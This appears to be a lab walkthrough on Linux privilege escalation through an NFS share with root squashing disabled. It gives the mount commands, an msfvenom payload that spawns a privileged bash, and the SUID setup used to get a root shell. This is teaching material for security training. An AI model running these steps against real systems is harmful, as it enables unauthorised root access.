Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:
```
cat /etc/exports
```
```
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```
Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:
```
sudo su
```
Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
Still using Kali's root user, make the file executable and set the SUID permission:
```
chmod +xs /tmp/nfs/shell.elf
```
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
```
/tmp/shell.elf
```